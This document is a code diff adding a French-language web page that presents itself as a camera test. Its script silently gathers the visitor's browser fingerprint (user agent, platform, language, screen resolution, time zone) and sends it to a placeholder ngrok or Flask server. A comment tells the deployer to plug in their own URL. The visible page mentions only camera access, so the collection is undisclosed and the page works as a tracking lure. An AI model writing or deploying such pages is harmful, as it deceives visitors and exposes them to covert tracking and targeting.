@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Test Caméra & Infos</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+      background-color: #f0f0f0;
+    }
+    video {
+      border: 2px solid #333;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>🔍 Test Caméra et Informations</h2>
+  <p>Autorisez l'accès à la caméra pour continuer.</p>
+  <video id="video" width="300" autoplay></video>
+
+  <script>
+    // Remplace cette URL par ton adresse ngrok ou ton lien Flask public
+    const FLASK_URL = "https://ton-ngrok-ou-flask-url/send_info";
+
+    // 1. Activer la caméra
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        document.getElementById('video').srcObject = stream;
+      })
+      .catch(error => {
+        console.error("Erreur caméra :", error);
+      });
+
+    // 2. Collecte des infos système
+    const infos = {
+      userAgent: navigator.userAgent,
+      plateforme: navigator.platform,
+      langue: navigator.language,
+      resolution: screen.width + "x" + screen.height,
+      fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    };
+
+    // 3. Envoi vers ton serveur Flask
+    fetch(FLASK_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(infos)
+    }).then(res => {
+      console.log("✅ Données envoyées !");
+    }).catch(err => {
+      console.error("❌ Échec envoi :", err);
+    });
+  </script>
+</body>
+</html>
